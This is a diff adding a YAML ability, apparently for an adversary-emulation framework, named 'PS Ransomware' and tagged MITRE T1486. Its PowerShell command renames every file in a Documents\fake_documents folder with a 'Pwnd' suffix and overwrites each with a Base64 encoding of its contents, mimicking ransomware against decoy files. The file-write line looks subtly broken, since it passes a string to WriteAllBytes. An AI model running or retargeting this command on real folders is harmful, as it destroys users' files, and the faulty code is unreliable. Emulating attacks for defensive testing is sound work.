@@ -1,0 +1,37 @@
+- technique_id: T1486
+  executors:
+  - cleanup: []
+    command: '
+    $TargetFolder="$($env:USERPROFILE)\Documents\fake_documents";
+    foreach($f in Get-ChildItem $TargetFolder) { 
+      Get-Content -Path $f.fullname -TotalCount 1; 
+      Rename-Item -Path $f.fullname -NewName ($f.fullname + "Pwnd");
+      [IO.File]::WriteAllBytes(($f.fullname + "Pwnd"),([System.Convert]::ToBase64String([IO.File]::ReadAllBytes($f.fullname +"Pwnd")))); 
+      } 
+      '
+    code: null
+    build_target: null
+    timeout: 10
+    platform: windows
+    variations: []
+    payloads: []
+    language: null
+    additional_info: {}
+    name: psh
+    uploads: []
+    parsers: []
+  delete_payload: true
+  privilege: ''
+  tactic: execution
+  access: {}
+  plugin: ''
+  repeatable: false
+  buckets: []
+  additional_info:
+    cleanup: '[]'
+  requirements: []
+  name: 'PS Ransomware'
+  technique_name: Data Encrypted for Impact
+  singleton: false
+  description: Will encode files in fake_documents
+  id: ps_ransomware
